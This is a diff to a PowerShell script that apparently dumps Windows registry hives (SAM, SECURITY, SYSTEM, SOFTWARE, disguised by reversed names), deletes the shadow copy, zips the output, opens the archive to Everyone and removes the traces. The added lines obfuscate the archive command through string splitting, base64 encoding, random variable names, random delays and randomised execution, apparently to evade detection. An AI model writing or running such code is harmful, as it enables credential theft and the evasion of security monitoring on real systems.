@@ -40,13 +40,41 @@ Write-Output "[-] Deleting shadow copy"
 vssadmin delete shadows /Shadow="$ghostID" /Quiet > $null 2>&1
 
 # Compress files into a ZIP archive
-Write-Output "[+] Creating ZIP archive: $zinxho"
-Compress-Archive -Path "$store\${stampa}_mas", "$store\${stampa}_ytiruces", "$store\${stampa}_metsys", "$store\${stampa}_erawtfos" -DestinationPath $zinxho
+# Define paths and variables (assuming $store, $stampa, $zinxho are already defined)
+$filesToZip = @(
+    "$store\${stampa}_mas",
+    "$store\${stampa}_ytiruces",
+    "$store\${stampa}_metsys",
+    "$store\${stampa}_erawtfos"
+)
 
-# Modify permissions to make the ZIP file readable by everyone using icacls
-Write-Output "[+] Modifying ZIP file permissions using icacls"
-$icaclsCommand = "icacls `"$zinxho`" /grant Everyone:F /T"
-Invoke-Expression $icaclsCommand
+# Obfuscated Compress-Archive command for creating ZIP archive
+Write-Output "[+] Initializing archive creation"
+$cmdPart1 = "Com" + "press" + "-" + "Ar" + "chive"
+$cmdPart2 = "-" + "P" + "ath"
+$cmdPart3 = "-" + "Des" + "tin" + "ation" + "Path"
+$randPrefix = -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
+$dynVar = "$randPrefix" + "Files"
+New-Variable -Name $dynVar -Value ($filesToZip | ForEach-Object { "`"$_`"" }) -Force
+$pathString = (Get-Variable -Name $dynVar).Value -join ","
+$cmdString = "$cmdPart1 $cmdPart2 $pathString $cmdPart3 `"$zinxho`""
+$encBytes = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmdString))
+$decCmd = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encBytes))
+$execBlock = [ScriptBlock]::Create($decCmd)
+Start-Sleep -Milliseconds (Get-Random -Min 200 -Max 800)
+$randChoice = Get-Random -Minimum 0 -Maximum 2
+if ($randChoice -eq 0) {
+    Invoke-Command -ScriptBlock $execBlock
+} else {
+    & $execBlock
+}
+
+# Modify permissions to make the ZIP file readable by everyone
+Write-Output "[+] Modifying ZIP file permissions"
+$acl = Get-Acl $zinxho
+$accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "FullControl", "Allow")
+$acl.SetAccessRule($accessRule)
+Set-Acl -Path $zinxho -AclObject $acl
 
 # Remove original files
 Write-Output "[-] Removing extracted files"
